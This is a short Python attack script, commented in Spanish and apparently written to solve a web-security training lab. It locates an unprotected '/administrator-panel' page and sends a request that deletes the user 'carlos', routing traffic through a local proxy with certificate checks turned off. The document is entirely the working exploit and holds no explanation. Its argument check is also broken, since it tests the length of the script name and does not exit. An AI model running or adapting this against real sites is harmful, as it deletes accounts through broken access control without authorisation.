import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    """ Solicitud para encontrar el panel de administración """
    path = '/administrator-panel'
    path_delete = '/delete?username='
    user = 'carlos'
    r = requests.get(url + path, verify=False, proxies=proxies)
    if r.status_code == 200:
        print(f"[+] Pagína de administración encontrada..")
        print(f"[+] Eliminando usuario")
        delete_user = url + path + path_delete + user
        r2 = requests.get(delete_user, verify=False, proxies=proxies)
        if r2.status_code == 200:
            print(f"[+] Usuario {user} eliminado")
        else:
            print(f"[-] No fue posible elimanar el usuario {user}")        
    else:
        print("[-] Página de administración no encontrada.")

def main():
    if (len(sys.argv[0]))!=2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        
    
    url = sys.argv[1]
    delete_user(url)
    

if __name__ == "__main__":
    main()